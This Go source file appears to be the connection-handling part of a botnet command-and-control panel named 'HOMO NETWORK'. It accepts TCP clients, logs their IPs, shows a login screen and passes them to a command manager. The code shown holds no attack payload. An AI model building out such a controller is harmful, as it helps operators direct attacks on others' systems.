package cnc

import (
	"homo/network/config"
	"net"
	"os"
	"os/exec"
	"strconv"
	"sync"

	"github.com/fatih/color"
)

var (
	Conns []net.Conn
)

var wg sync.WaitGroup

func cmd(name string, arg ...string) {
	cmd := exec.Command(name, arg...)
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func cls(conn net.Conn) {
	Print("\x1B[2J\x1B[H", conn)
	CommandManager(conn)
}

func Start(c *config.Config) {
	NewCon := make(chan net.Conn)

	server, err := net.Listen("tcp", c.Cnc.Server+":"+c.Cnc.Port)

	if err != nil {
		color.HiRed("Fails to start server")
		os.Exit(0)
	}

	go func() {
		for {
			conn, err := server.Accept()
			if err != nil {
				continue
			}

			NewCon <- conn
		}
	}()

	for {
		select {
		case conn := <-NewCon:
			go newuser(conn)

		}
	}

}

func newuser(conn net.Conn) {

	Conns = append(Conns, conn)
	if addr, ok := conn.RemoteAddr().(*net.TCPAddr); ok {
		Log(" *_🌐 New connection_*||*IP: " + addr.IP.String() + "||Port: " + strconv.Itoa(addr.Port))
	}
	Print("\x1B[2J\x1B[H", conn)
	conn.Write([]byte("\033]0;HOMO NETWORK" + "\007"))
	LoginPage(conn)

	cls(conn)
	CommandManager(conn)

}
